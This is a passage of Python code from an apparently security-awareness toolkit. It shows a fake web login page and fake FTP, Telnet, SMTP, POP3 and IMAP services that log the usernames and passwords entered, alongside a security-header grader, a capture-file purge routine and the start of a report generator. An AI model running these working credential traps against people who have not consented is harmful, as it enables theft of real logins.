        ("Password storage", "FULL (operator enabled)" if capture_passwords else "masked (first char only)"),
        ("Redirect after submit", redirect_url or "built-in training notice"),
        ("Run duration", format_duration(duration)),
        ("Client deadline", "%.1fs per connection (slow/silent clients dropped)"
         % max(1.0, float(client_timeout))),
        ("Concurrent cap", "%d connection(s), %d refused so far"
         % (server.max_connections, server.refused_connections)),
        ("Connection deadline", "%.0fs per connection (slow-drip clients are cut off)"
         % server.connection_budget),
    ])
    warn("security-awareness use only: deploy against participants who have consented, and never on "
         "networks you do not administer.")
    if not prompt_yes_no("Start the listener now", False):
        try:
            server.server_close()
        except OSError:
            pass
        warn("harvester cancelled.")
        return OrderedDict([("aborted", True)])
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    ok("listener active on port %d - press Ctrl-C to stop early." % actual_port)
    started = time.time()
    try:
        deadline = started + max(5.0, float(duration))
        while time.time() < deadline:
            time.sleep(0.5)
    except KeyboardInterrupt:
        warn("harvester stopped by operator.")
    finally:
        try:
            server.shutdown()
            server.server_close()
        except OSError:
            pass
    heading("HARVESTER SUMMARY")
    kv_table([
        ("Runtime", format_duration(time.time() - started)),
        ("Submissions", len(captures)),
        ("Unique clients", len({entry["client"] for entry in captures})),
    ])
    for entry in captures:
        out("  %-19s %-15s user=%-16s pass=%s" % (
            entry["timestamp"][11:], entry["client"], entry["username"][:16], entry["password"]))
    if not captures:
        note("no submissions during the window.")
    summary = OrderedDict([
        ("mode", "http-harvester"),
        ("bind", "%s:%d" % (bind_address, actual_port)),
        ("title", title),
        ("credentials_full_capture", bool(capture_passwords)),
        ("duration_seconds", round(time.time() - started, 2)),
        ("client_timeout_seconds", round(max(1.0, float(client_timeout)), 2)),
        ("connection_deadline_seconds", round(max(0.0, float(server.connection_budget)), 2)),
        ("max_connections", int(server.max_connections)),
        ("refused_connections", int(server.refused_connections)),
        ("submissions", captures),
    ])
    artifact = LOGGER.scan("http_harvester", summary, target="%s:%d" % (bind_address, actual_port))
    if artifact:
        note("artefact: %s" % artifact)
    return summary


TCP_TRAP_BANNERS = {
    "ftp": b"220 PrismStrike Lab FTP service (vsFTPd 3.0.3) ready.\r\n",
    "smtp": b"220 lab-mail.prismstrike.local ESMTP Postfix\r\n",
    "pop3": b"+OK PrismStrike POP3 service ready\r\n",
    "imap": b"* OK [CAPABILITY IMAP4rev1] PrismStrike IMAP ready\r\n",
    "telnet": b"\r\nPrismStrike Lab Appliance Firmware 4.2\r\n\r\nlogin: ",
    "custom": b"PrismStrike lab service ready - please authenticate\r\nlogin: ",
}


def tcp_cred_listener(bind_address: str = "0.0.0.0",
                      ports: Optional[Sequence[Tuple[int, str]]] = None,
                      duration: float = 300.0, max_attempts: int = 3,
                      capture_passwords: bool = False,
                      custom_banner: Optional[bytes] = None,
                      client_timeout: float = 30.0,
                      max_connections: int = 32,
                      connection_budget: float = 120.0) -> Dict[str, Any]:
    """
    Multi-protocol credential trap for awareness exercises.

    Binds one thread per service, presents the protocol's native banner, parses
    USER/PASS/AUTH sequences (FTP, POP3, IMAP, SMTP) or a two-line login prompt
    (telnet-style), and records each attempt with source address and timing.
    """
    import socketserver as _socketserver
    ports = list(ports or [(21, "ftp"), (23, "telnet"), (25, "smtp"), (110, "pop3"), (143, "imap")])
    if not ports:
        raise FrameworkError("no ports configured for the trap")
    if len(ports) > 8:
        raise FrameworkError("at most 8 trap services are supported")
    for entry in ports:
        try:
            parse_port(entry[0])
        except FrameworkError as exc:
            raise FrameworkError(str(exc))
        if entry[1] not in TCP_TRAP_BANNERS:
            raise FrameworkError("unknown service kind '%s'" % entry[1])
    captures: List[Dict[str, Any]] = []
    lock = threading.RLock()
    servers: List[Any] = []
    threads: List[threading.Thread] = []

    class TrapHandler(_socketserver.StreamRequestHandler):
        banner = b""
        service = "custom"
        timeout = 120
        # As with the harvester: the socket timeout bounds silence, this is the
        # wall-clock cap for the whole login conversation.
        budget_seconds = max(0.0, float(connection_budget))

        def handle(self) -> None:
            peer = self.client_address[0] if self.client_address else "?"
            # A stalled client must not pin a handler thread: the socket carries a
            # hard deadline for both reads and writes.
            try:
                self.connection.settimeout(max(1.0, float(client_timeout)))
            except OSError:
                pass
            budget_deadline = ((time.time() + self.budget_seconds)
                               if self.budget_seconds > 0 else 0.0)
            self.budget_watchdog = _arm_read_deadline(self.connection, self.budget_seconds,
                                                      self._deadline_reached)
            LOGGER.event("listener", "%s trap: connection from %s" % (self.service, peer))
            try:
                self.wfile.write(self.banner)
                self.wfile.flush()
            except (BrokenPipeError, ConnectionResetError, OSError):
                return
            username = ""
            attempts = 0
            collected: List[str] = []
            while attempts < max_attempts:
                if budget_deadline:
                    remaining = budget_deadline - time.time()
                    if remaining <= 0:
                        break
                    try:
                        self.connection.settimeout(max(0.05, min(float(client_timeout),
                                                                 remaining)))
                    except OSError:
                        break
                try:
                    raw_line = self.rfile.readline(512)
                except (socket.timeout, OSError):
                    break
                if not raw_line:
                    break
                line = raw_line.decode("utf-8", "replace").strip()
                if not line:
                    continue
                collected.append(line)
                upper = line.upper()
                try:
                    if upper.startswith("USER ") or upper.startswith("LOGIN "):
                        username = line.split(None, 1)[1]
                        if self.service in ("ftp", "pop3"):
                            self.wfile.write(b"331 Please specify the password.\r\n")
                        elif self.service == "imap":
                            self.wfile.write(b"A1 OK LOGIN accepted, awaiting password\r\n")
                        else:
                            self.wfile.write(b"Password: ")
                        self.wfile.flush()
                        continue
                    if upper.startswith("PASS "):
                        password = line.split(None, 1)[1]
                        attempts += 1
                        self._record(peer, username, password, attempts, collected)
                        try:
                            self.wfile.write(b"530 Login incorrect.\r\n")
                            self.wfile.flush()
                        except OSError:
                            return
                        username = ""
                        continue
                    if self.service == "telnet" or self.service == "custom":
                        if not username and any(token in line.lower() for token in ("login", "user")):
                            username = line
                            try:
                                self.wfile.write(b"Password: ")
                                self.wfile.flush()
                            except OSError:
                                return
                            continue
                        if username:
                            attempts += 1
                            self._record(peer, username, line, attempts, collected)
                            try:
                                self.wfile.write(b"\r\nLogin incorrect\r\nlogin: ")
                                self.wfile.flush()
                            except OSError:
                                return
                            username = ""
                            continue
                    findings = scan_for_credentials(raw_line, redact=not capture_passwords)
                    if findings:
                        attempts += 1
                        first = findings[0]
                        self._record(peer, first.get("kind", "pattern"), str(first.get("preview", "")),
                                     attempts, collected)
                        continue
                    try:
                        self.wfile.write(b"500 Command not understood.\r\n")
                        self.wfile.flush()
                    except OSError:
                        return
                except (OSError, ValueError, TypeError):
                    break
            LOGGER.event("listener", "%s trap: session with %s ended (%d attempts)"
                         % (self.service, peer, attempts))

        def finish(self) -> None:
            watchdog = getattr(self, "budget_watchdog", None)
            if watchdog is not None:
                watchdog.cancel()
            super().finish()

        def _deadline_reached(self) -> None:
            connection = getattr(self, "connection", None)
            if connection is None or connection.fileno() < 0:
                return
            peer = self.client_address[0] if self.client_address else "?"
            LOGGER.event("listener",
                         "%s trap: connection deadline (%.0fs) reached - closing %s"
                         % (self.service, self.budget_seconds, peer), level="WARN")
            try:
                connection.shutdown(socket.SHUT_RD)
            except OSError:
                pass

        def _record(self, peer: str, username: str, password: str, attempt: int,
                    transcript: List[str]) -> None:
            record = OrderedDict([
                ("timestamp", format_timestamp()),
                ("service", self.service),
                ("client", peer),
                ("attempt", attempt),
                ("username", username or "(unknown)"),
                ("password", password if capture_passwords else mask_secret(password)),
                ("password_captured_in_full", bool(capture_passwords)),
                ("transcript", transcript[-8:]),
            ])
            with lock:
                captures.append(record)
            LOGGER.event("listener", "%s credential attempt from %s (user=%s)"
                         % (self.service, peer, record["username"]))
            out("")
            out("  %s %-6s attempt #%d from %-15s user=%-16s password=%s" % (
                c("CAPTURED", "bgreen", "bold"), self.service.upper(), attempt, peer,
                record["username"][:16], record["password"]))
            if alerts_armed():
                alert_credential(peer, self.service, record["username"],
                                 "(secret withheld from the relay)")

    class BoundedTrapServer(_socketserver.ThreadingTCPServer):
        """Threaded trap server with a hard cap on concurrently served connections."""
        daemon_threads = True
        allow_reuse_address = True
        request_queue_size = 32

        def __init__(self, address: Any, handler: Any, cap: int = 32) -> None:
            self.max_connections = max(1, int(cap))
            self.refused_connections = 0
            self.service_kind = "credential"
            super().__init__(address, handler)
            self._slots = threading.BoundedSemaphore(self.max_connections)

        def process_request(self, request: Any, client_address: Any) -> None:
            if not self._slots.acquire(blocking=False):
                self.refused_connections += 1
                LOGGER.event("listener", "%s trap connection cap (%d) reached - refused %s"
                             % (self.service_kind, self.max_connections, client_address[0]),
                             level="WARN")
                try:
                    request.close()
                except OSError:
                    pass
                return
            try:
                super().process_request(request, client_address)
            except BaseException:
                self._slots.release()
                raise

        def process_request_thread(self, request: Any, client_address: Any) -> None:
            try:
                super().process_request_thread(request, client_address)
            finally:
                self._slots.release()

    for port_number, service_kind in ports:
        banner = custom_banner or TCP_TRAP_BANNERS.get(service_kind, TCP_TRAP_BANNERS["custom"])
        handler_class = type("TrapHandler_%d_%s" % (port_number, service_kind),
                             (TrapHandler,), {"banner": banner, "service": service_kind})
        try:
            server = BoundedTrapServer((bind_address, int(port_number)), handler_class,
                                       cap=max_connections)
            server.service_kind = service_kind
        except OSError as exc:
            warn("could not bind port %d (%s): %s - skipping this service" % (port_number, service_kind, exc))
            continue
        servers.append(server)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        threads.append(thread)
        ok("%s trap listening on %s:%d" % (service_kind.upper(), bind_address, port_number))
    if not servers:
        raise FrameworkError("no trap services could bind - check privileges and port availability")
    heading("PROTOCOL CREDENTIAL TRAPS")
    kv_table([
        ("Bind address", bind_address),
        ("Services", ", ".join("%s/%d" % (kind.upper(), port_number) for port_number, kind in ports)),
        ("Password storage", "FULL (operator enabled)" if capture_passwords else "masked (first char only)"),
        ("Max attempts per session", max_attempts),
        ("Run duration", format_duration(duration)),
        ("Client deadline", "%.1fs per connection" % max(1.0, float(client_timeout))),
        ("Concurrent cap", "%d connection(s) per service" % max(1, int(max_connections))),
        ("Connection deadline", "%.0fs per connection (slow-drip clients are cut off)"
         % max(0.0, float(connection_budget))),
    ])
    warn("awareness use only: the operator is responsible for consent and scope.")
    if not prompt_yes_no("Start the listeners now", False):
        for server in servers:
            try:
                server.shutdown()
                server.server_close()
            except OSError:
                pass
        warn("credential traps cancelled.")
        return OrderedDict([("aborted", True)])
    started = time.time()
    try:
        deadline = started + max(5.0, float(duration))
        while time.time() < deadline:
            time.sleep(0.5)
    except KeyboardInterrupt:
        warn("credential traps stopped by operator.")
    finally:
        for server in servers:
            try:
                server.shutdown()
                server.server_close()
            except OSError:
                pass
    heading("TRAP SUMMARY")
    kv_table([
        ("Runtime", format_duration(time.time() - started)),
        ("Capture events", len(captures)),
        ("Unique clients", len({entry["client"] for entry in captures})),
    ])
    per_service: Counter = Counter(entry["service"] for entry in captures)
    for service, count in per_service.most_common():
        out("    %-8s %d attempt(s)" % (service.upper(), count))
    if not captures:
        note("no authentication attempts during the window.")
    summary = OrderedDict([
        ("mode", "credential-traps"),
        ("bind", bind_address),
        ("services", [{"port": port_number, "service": kind} for port_number, kind in ports]),
        ("credentials_full_capture", bool(capture_passwords)),
        ("duration_seconds", round(time.time() - started, 2)),
        ("client_timeout_seconds", round(max(1.0, float(client_timeout)), 2)),
        ("max_connections_per_service", max(1, int(max_connections))),
        ("connection_deadline_seconds", round(max(0.0, float(connection_budget)), 2)),
        ("refused_connections", sum(int(getattr(entry, "refused_connections", 0))
                                    for entry in servers)),
        ("captures", captures),
    ])
    artifact = LOGGER.scan("credential_traps", summary, target=bind_address)
    if artifact:
        note("artefact: %s" % artifact)
    return summary


@module_guard("Awareness Listeners")
def module_listeners(args: Optional[List[str]] = None) -> None:
    """Interactive awareness-testing listeners (HTTP page + protocol traps)."""
    while True:
        heading("MODULE 17 - AWARENESS LISTENERS")
        out("  %s" % c("consent-based security-awareness testing only - log with care, store minimally",
                       "byellow"))
        options = OrderedDict([
            ("1", "HTTP credential-harvest listener (inline login page)"),
            ("2", "Protocol credential traps (FTP/Telnet/SMTP/POP3/IMAP)"),
            ("3", "Inspect credential patterns the sniffer and traps detect"),
            ("4", "ONLINE: awareness pipeline (client geolocation, capture alerts)"),
            ("0", "Return to main menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("listen> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()

        if choice == "4":
            online_listeners_console()
            continue
        if choice == "0":
            return
        if choice == "1":
            bind_raw = prompt_text("bind address", default="0.0.0.0")
            if bind_raw is PROMPT_ABORT:
                continue
            port_raw = prompt_text("port", default="8080")
            if port_raw is PROMPT_ABORT:
                continue
            try:
                port = parse_port(port_raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            title = prompt_text("page title", default="Staff Portal")
            if title is PROMPT_ABORT:
                continue
            user_field = prompt_text("username field name", default="username")
            if user_field is PROMPT_ABORT:
                continue
            pass_field = prompt_text("password field name", default="password")
            if pass_field is PROMPT_ABORT:
                continue
            redirect = prompt_text("redirect URL after submit (blank = training notice)",
                                   default="", allow_blank=True)
            if redirect is PROMPT_ABORT:
                continue
            duration = prompt_float("run duration seconds", 5.0, 14400.0, 300.0)
            if duration is PROMPT_ABORT:
                continue
            full_capture = prompt_yes_no("store passwords in FULL (default: masked)?", False)
            if full_capture:
                warn("full password storage requires explicit handling rules - minimise and purge after.")
            http_harvester(str(bind_raw), int(port), str(title), str(user_field), str(pass_field),
                           duration=float(duration), capture_passwords=full_capture,
                           redirect_url=str(redirect).strip())
        elif choice == "2":
            bind_raw = prompt_text("bind address", default="0.0.0.0")
            if bind_raw is PROMPT_ABORT:
                continue
            default_spec = "21:ftp,23:telnet,25:smtp,110:pop3,143:imap"
            spec_raw = prompt_text("services as port:kind list (kinds: ftp/telnet/smtp/pop3/imap/custom)",
                                   default=default_spec)
            if spec_raw is PROMPT_ABORT:
                continue
            ports: List[Tuple[int, str]] = []
            for token in re.split(r"[,\s]+", str(spec_raw)):
                if not token:
                    continue
                if ":" not in token:
                    err("token '%s' must look like port:kind" % token)
                    ports = []
                    break
                port_part, kind_part = token.split(":", 1)
                try:
                    ports.append((parse_port(port_part), kind_part.strip().lower()))
                except FrameworkError as exc:
                    err(str(exc))
                    ports = []
                    break
            if not ports:
                continue
            duration = prompt_float("run duration seconds", 5.0, 14400.0, 300.0)
            if duration is PROMPT_ABORT:
                continue
            attempts = prompt_int("max attempts per session", 1, 10, 3)
            if attempts is PROMPT_ABORT:
                continue
            full_capture = prompt_yes_no("store passwords in FULL (default: masked)?", False)
            if full_capture:
                warn("full password storage requires explicit handling rules - minimise and purge after.")
            try:
                tcp_cred_listener(str(bind_raw), ports, duration=float(duration),
                                  max_attempts=int(attempts), capture_passwords=full_capture)
            except FrameworkError as exc:
                err(str(exc))
        elif choice == "3":
            heading("CREDENTIAL DETECTION PATTERNS")
            for kind, pattern in CRED_PATTERNS:
                out("  %s  %s" % (c(kind.ljust(24), "cyan"), c(pattern[:88], "grey")))
            out("")
            note("the sniffer's credential watch and both listeners share this catalogue; "
                 "matches are redacted unless full capture is explicitly enabled.")
            demo = prompt_text("paste a sample payload to test detection (blank = skip)",
                               default="", allow_blank=True)
            if demo is PROMPT_ABORT or not str(demo).strip():
                continue
            findings = scan_for_credentials(str(demo).encode("utf-8", "replace"))
            if findings:
                for finding in findings:
                    out("  %s %-24s offset=%-6s %s" % (
                        c("MATCH", "bgreen", "bold"), finding["kind"], finding["offset"],
                        finding["preview"]))
            else:
                warn("no credential-shaped material detected in the sample.")
        else:
            warn("unrecognised selection '%s'." % choice)


# ===========================================================================
# MODULE EXTRAS - reporting (HTML/Markdown), log pruning, throughput, socket map
# ===========================================================================
SECURITY_HEADER_WEIGHTS: Dict[str, int] = {
    "strict-transport-security": 25,
    "content-security-policy": 25,
    "x-frame-options": 10,
    "x-content-type-options": 10,
    "referrer-policy": 10,
    "permissions-policy": 8,
    "cross-origin-opener-policy": 6,
    "cross-origin-embedder-policy": 6,
}
SECURITY_HEADER_ADVICE: Dict[str, str] = {
    "strict-transport-security": "add HSTS with a long max-age (and includeSubDomains)",
    "content-security-policy": "add a CSP that avoids 'unsafe-inline' and restricts script sources",
    "x-frame-options": "add DENY or SAMEORIGIN (or frame-ancestors in the CSP)",
    "x-content-type-options": "add nosniff so browsers stop guessing content types",
    "referrer-policy": "set no-referrer or strict-origin-when-cross-origin",
    "permissions-policy": "restrict camera/microphone/geolocation features explicitly",
    "cross-origin-opener-policy": "set same-origin to isolate the browsing context",
    "cross-origin-embedder-policy": "set require-corp where cross-origin isolation is needed",
}
SECURITY_HEADER_GRADES: Tuple[Tuple[int, str], ...] = ((90, "A"), (80, "B"), (65, "C"),
                                                       (50, "D"), (30, "E"), (0, "F"))


def _header_credit(name: str, value: str) -> Tuple[float, str]:
    """
    Return (credit ratio, note) for one present header.

    A header set to a token that does not actually protect anything (max-age=0,
    'unsafe-inline', 'allow-from') earns half credit and a note rather than full
    marks - presence alone is not posture.
    """
    lowered = value.strip().lower()
    if not lowered:
        return 0.0, "present but empty"
    if name == "strict-transport-security":
        match = re.search(r"max-age\s*=\s*(\d+)", lowered)
        if match:
            seconds = int(match.group(1))
            if seconds <= 0:
                return 0.5, "max-age=0 disables HSTS"
            if seconds < 15552000:
                return 0.75, "max-age below the 180-day recommendation"
        return 1.0, ""
    if name == "content-security-policy":
        if "unsafe-inline" in lowered or "unsafe-eval" in lowered:
            return 0.5, "allows 'unsafe-inline'/'unsafe-eval'"
        if "default-src" not in lowered and "script-src" not in lowered:
            return 0.6, "no default-src/script-src directive"
        return 1.0, ""
    if name == "x-frame-options":
        if "allow-from" in lowered:
            return 0.5, "allow-from is ignored by modern browsers"
        if lowered in ("deny", "sameorigin"):
            return 1.0, ""
        return 0.5, "unrecognised value '%s'" % value.strip()[:24]
    if name == "x-content-type-options":
        return (1.0, "") if "nosniff" in lowered else (0.5, "should be 'nosniff'")
    return 1.0, ""


def security_header_score(headers: Dict[str, Any]) -> Dict[str, Any]:
    """
    Convert a response header map into a 0-100 posture score and an A-F grade.

    Weights follow practical impact: HSTS and CSP dominate, framing/sniffing
    protections next, isolation and referrer policy last. Half credit is given
    for headers present with a value that does not actually protect anything.
    """
    lowered = {str(key).lower(): str(value) for key, value in (headers or {}).items()}
    earned = 0.0
    maximum = 0
    present: List[str] = []
    partial: List[str] = []
    missing: List[str] = []
    notes: List[str] = []
    for header_name, weight in SECURITY_HEADER_WEIGHTS.items():
        maximum += weight
        value = lowered.get(header_name, "").strip()
        if not value:
            missing.append(header_name)
            continue
        ratio, note = _header_credit(header_name, value)
        earned += weight * ratio
        if ratio >= 1.0:
            present.append(header_name)
        else:
            partial.append(header_name)
            notes.append("%s: %s" % (header_name, note))
    score = int(round((earned / maximum) * 100.0)) if maximum else 0
    grade = "F"
    for threshold, letter in SECURITY_HEADER_GRADES:
        if score >= threshold:
            grade = letter
            break
    recommendations = [SECURITY_HEADER_ADVICE[name] for name in missing if name in SECURITY_HEADER_ADVICE]
    recommendations.extend(note for note in notes if note)
    return OrderedDict([
        ("grade", grade),
        ("score", score),
        ("max_score", maximum),
        ("present", present),
        ("partial", partial),
        ("missing", missing),
        ("notes", notes),
        ("recommendations", recommendations[:8]),
    ])


def collect_http_hardening_findings(artifact_dir: str = "") -> List[Dict[str, Any]]:
    """
    Score every http_inspect artefact recorded in this session.

    Returns one finding per inspected URL with its grade, so a report can show a
    posture summary without re-contacting anything.
    """
    directory = artifact_dir or LOGGER.artifact_dir
    findings: List[Dict[str, Any]] = []
    try:
        names = sorted(os.listdir(directory))
    except OSError:
        return findings
    session_id = str(getattr(LOGGER, "session_id", "") or "")
    candidates = [name for name in names
                  if "http_inspect" in name and name.endswith(".json")]
    if session_id:
        this_session = [name for name in candidates if name.startswith(session_id)]
        if this_session:
            candidates = this_session
    for name in candidates:
        full = os.path.join(directory, name)
        try:
            with open(full, "r", encoding="utf-8") as handle:
                record = json.load(handle)
        except (OSError, ValueError):
            continue
        summary = record.get("summary") if isinstance(record, dict) else None
        if not isinstance(summary, dict):
            continue
        scored = security_header_score(summary.get("security_headers") or {})
        findings.append(OrderedDict([
            ("url", str(summary.get("final_url") or summary.get("requested_url") or "")),
            ("status", summary.get("status")),
            ("grade", scored["grade"]),
            ("score", scored["score"]),
            ("present", len(scored["present"]),
             ),
            ("missing", scored["missing"]),
            ("artifact", name),
            ("recorded_at", str(record.get("recorded_at", ""))),
        ]))
    findings.sort(key=lambda entry: (entry["score"], entry["url"]))
    return findings


TRANSIENT_CAPTURE_PATTERNS: Tuple[str, ...] = (
    "*_online_capture_*.pcap", "*_online_capture_*.pcapng",
    "*_fetch_*.pcap", "*_fetch_*.pcapng",
    "*_capture_*.pcap", "*_capture_*.pcapng",
    "*.pcap.tmp", "*.pcapng.tmp",
)
STRUCTURED_TRAIL_SUFFIXES: Tuple[str, ...] = (".json", ".ndjson", ".txt", ".md", ".html", ".log")


def purge_transient_captures(dry_run: bool = True, max_age_hours: float = 0.0,
                             artifact_dir: str = "") -> Dict[str, Any]:
    """
    Atomically remove raw capture files while preserving the structured audit trail.

    Only binary capture artefacts are eligible (`*_online_capture_*.pcap*`,
    `*_fetch_*.pcap*`, `*_capture_*.pcap*`); JSON/NDJSON/TXT/MD/HTML ledgers are never
    matched. Each file is first renamed into a per-run quarantine directory - an atomic
    rename on the same filesystem - and that directory is removed afterwards, so an
    interrupted run cannot leave a half-deleted capture behind.
    """
    directory = artifact_dir or LOGGER.artifact_dir
    try:
        entries = sorted(os.listdir(directory))
    except OSError as exc:
        raise FrameworkError("artefact directory unreadable: %s" % exc)
    try:
        age_hours = max(0.0, float(max_age_hours))
    except (TypeError, ValueError):
        age_hours = 0.0
    cutoff = (time.time() - (age_hours * 3600.0)) if age_hours > 0 else None
    matched: List[Dict[str, Any]] = []
    for name in entries:
        lowered = name.lower()
        if name.startswith(".") or lowered.endswith(STRUCTURED_TRAIL_SUFFIXES):
            continue
        if not any(fnmatch.fnmatch(lowered, pattern) for pattern in TRANSIENT_CAPTURE_PATTERNS):
            continue
        full = os.path.join(directory, name)
        if not os.path.isfile(full):
            continue
        try:
            info = os.stat(full)
        except OSError:
            continue
        if cutoff is not None and info.st_mtime > cutoff:
            continue
        matched.append(OrderedDict([("name", name), ("bytes", int(info.st_size)),
                                    ("modified", format_timestamp(info.st_mtime))]))
    total_bytes = sum(entry["bytes"] for entry in matched)
    result: Dict[str, Any] = OrderedDict([
        ("mode", "purge-transient-captures"),
        ("directory", directory),
        ("dry_run", bool(dry_run)),
        ("min_age_hours", age_hours),
        ("matched", len(matched)),
        ("matched_bytes", total_bytes),
        ("files", matched),
        ("removed", 0),
        ("removed_bytes", 0),
        ("quarantine", ""),
        ("failed", []),
    ])
    if dry_run or not matched:
        return result
    staging = os.path.join(directory, ".purge_staging_%s" % uuid.uuid4().hex[:8])
    try:
        os.makedirs(staging, exist_ok=False)
    except OSError as exc:
        raise FrameworkError("could not create the quarantine directory: %s" % exc)
    result["quarantine"] = staging
    removed = 0
    removed_bytes = 0
    for entry in matched:
        try:
            os.replace(os.path.join(directory, entry["name"]),
                       os.path.join(staging, entry["name"]))
        except OSError as exc:
            result["failed"].append({"name": entry["name"], "error": str(exc)})
            continue
        removed += 1
        removed_bytes += entry["bytes"]
    try:
        shutil.rmtree(staging)
    except OSError as exc:
        result["failed"].append({"name": staging, "error": "quarantine cleanup: %s" % exc})
    result["removed"] = removed
    result["removed_bytes"] = removed_bytes
    LOGGER.event("maintenance", "transient capture purge removed %d file(s) (%d bytes) from %s"
                 % (removed, removed_bytes, directory))
    return result


def purge_transient_captures_interactive() -> None:
    """Menu wrapper for 18 option 12 - wipe raw captures, keep the audit trail."""
    default_dir = LOGGER.artifact_dir
    scope = prompt_text("artefact directory", default=default_dir)
    if scope is PROMPT_ABORT:
        return
    min_age = prompt_float("only files older than (hours; 0 = every raw capture)",
                           0.0, 8760.0, 0.0)
    if min_age is PROMPT_ABORT:
        return
    target_dir = str(scope).strip() or default_dir
    try:
        preview = purge_transient_captures(dry_run=True, max_age_hours=float(min_age),
                                           artifact_dir=target_dir)
    except FrameworkError as exc:
        err(str(exc))
        return
    heading("TRANSIENT CAPTURE PURGE - DRY RUN")
    kv_table([
        ("Directory", preview["directory"]),
        ("Raw captures matched", preview["matched"]),
        ("Reclaimable", "%s (%d bytes)" % (format_bytes(preview["matched_bytes"]),
                                           preview["matched_bytes"])),
        ("Minimum age", "%.1f hour(s)" % preview["min_age_hours"]),
        ("Preserved", "every structured ledger (.json/.ndjson/.txt/.md/.html) is excluded"),
    ])
    for entry in preview["files"][:40]:
        out("  %-52s %10s  %s" % (entry["name"][:52], format_bytes(entry["bytes"]),
                                  entry["modified"]))
    if preview["matched"] > 40:
        note("%d further file(s) not shown." % (preview["matched"] - 40))
    if not preview["matched"]:
        note("nothing to purge - no transient captures in the artefact directory.")
        return
    if not prompt_yes_no("atomically delete these %d capture file(s) now"
                         % preview["matched"], False):
        warn("purge cancelled - nothing was deleted.")
        return
    try:
        result = purge_transient_captures(dry_run=False, max_age_hours=float(min_age),
                                          artifact_dir=target_dir)
    except FrameworkError as exc:
        err(str(exc))
        return
    ok("removed %d raw capture(s), reclaimed %s"
       % (result["removed"], format_bytes(result["removed_bytes"])))
    if result["failed"]:
        warn("%d file(s) could not be removed (detail recorded in the artefact)."
             % len(result["failed"]))
    summary = OrderedDict([("mode", "transient-purge"), ("dry_run", False),
                           ("result", result)])
    artifact = LOGGER.scan("transient_purge", summary, target=result["directory"])
    if artifact:
        note("artefact: %s" % artifact)


def security_header_scorer_interactive() -> None:
    'Menu wrapper for 18 option 11 - grade HTTP security headers.'
    options = OrderedDict([
        ("1", "Grade this session's http_inspect artefacts"),
        ("2", "Inspect a live URL and grade it now"),
        ("3", "Score a header set pasted by hand"),
    ])
    for key, label in options.items():
        out("  [%s] %s" % (c(key, "byellow", "bold"), label))
    choice = prompt_text("scorer> select")
    if choice is PROMPT_ABORT:
        return
    choice = str(choice).strip()
    if choice == "1":
        findings = collect_http_hardening_findings()
        if not findings:
            note("no http_inspect artefacts recorded in this session.")
            return
        heading("HTTP HARDENING GRADES (SESSION ARTEFACTS)")
        out(c("  %-5s %-6s %-52s %s" % ("GRADE", "SCORE", "URL", "MISSING"), "bold"))
        for entry in findings:
            out("  %-5s %-6d %-52s %s" % (entry["grade"], entry["score"], entry["url"][:52],
                                          ", ".join(entry["missing"]) or "none"))
        summary = OrderedDict([("mode", "hardening-score-session"),
                               ("inspections", len(findings)),
                               ("grades", [{"url": entry["url"], "grade": entry["grade"],
                                            "score": entry["score"],
                                            "missing": entry["missing"]}
                                           for entry in findings])])
        artifact = LOGGER.scan("hardening_score", summary, target="session-http-inspect")
        if artifact:
            note("artefact: %s" % artifact)
        return
    if choice == "2":
        url = prompt_text("URL (https:// is assumed when the scheme is omitted)")
        if url is PROMPT_ABORT:
            return
        try:
            summary = http_inspect(str(url).strip())
        except FrameworkError as exc:
            err(str(exc))
            return
        note("grade %s (score %d/100)" % (summary["hardening_grade"], summary["hardening_score"]))
        return
    if choice == "3":
        out("  paste headers as name: value, one per line; blank line to finish")
        headers: Dict[str, str] = {}
        while True:
            raw = prompt_text("header (blank = done)", default="", allow_blank=True)
            if raw is PROMPT_ABORT or not str(raw).strip():
                break
            if ":" not in str(raw):
                warn("ignoring '%s' (expected name: value)" % raw)
                continue
            name, _, value = str(raw).partition(":")
            headers[name.strip().lower()] = value.strip()
        if not headers:
            err("no headers supplied.")
            return
        scored = security_header_score(headers)
        heading("PASTED HEADER SET - POSTURE")
        kv_table([
            ("Grade", "%s (score %d/100)" % (scored["grade"], scored["score"])),
            ("Present", ", ".join(scored["present"]) or "none"),
            ("Partial", ", ".join(scored["partial"]) or "none"),
            ("Missing", ", ".join(scored["missing"]) or "none - excellent posture"),
            ("Recommendations", "; ".join(scored["recommendations"][:4]) or "none"),
        ])
        return
    note("unknown scorer option '%s'." % choice)


def generate_html_report(output_dir: str = "") -> str:
    """Render the whole session (events + artefacts + counters) as one HTML file."""
    import html as _html
    directory = output_dir or LOGGER.log_dir
    path = os.path.join(directory, "report_%s.html" % LOGGER.session_id)
    artefacts: List[Tuple[str, int]] = []
    try:
        for name in sorted(os.listdir(LOGGER.artifact_dir)):
            full = os.path.join(LOGGER.artifact_dir, name)
            try:
                artefacts.append((name, os.path.getsize(full)))
            except OSError:
                continue
    except OSError:
        artefacts = []
    events = LOGGER.tail(100000)
    level_rows = []
    for line in events:
        match = re.match(r"\[(?P<ts>[^\]]+)\] \[(?P<level>\s*\w+\s*)\] \[(?P<kind>[^\]]+)\] (?P<msg>.*)", line)
        if match:
            level_rows.append(match.groupdict())
    rows_html = "\n".join(
        "<tr class='lvl-%s'><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>" % (
            _html.escape(row["level"].strip().lower()), _html.escape(row["ts"]),
            _html.escape(row["level"].strip()), _html.escape(row["kind"].strip()),
            _html.escape(row["msg"]))
        for row in level_rows[-3000:])
    artefact_html = "\n".join(
        "<tr><td>%s</td><td>%s</td></tr>" % (_html.escape(name), format_bytes(size))
        for name, size in artefacts)
    counters_html = "\n".join(
        "<tr><td>%s</td><td>%d</td></tr>" % (_html.escape(kind), count)
        for kind, count in sorted(LOGGER.counters.items()))
    hardening = collect_http_hardening_findings()
    hardening_html = "\n".join(
        "<tr><td><span class='grade g-%s'>%s</span></td><td>%d</td><td>%s</td><td>%s</td></tr>"
        % (_html.escape(entry["grade"].lower()), _html.escape(entry["grade"]), entry["score"],
           _html.escape(entry["url"])[:90],
           _html.escape(", ".join(entry["missing"])) or "none - excellent posture")
        for entry in hardening)
    hardening_note = ("" if hardening else
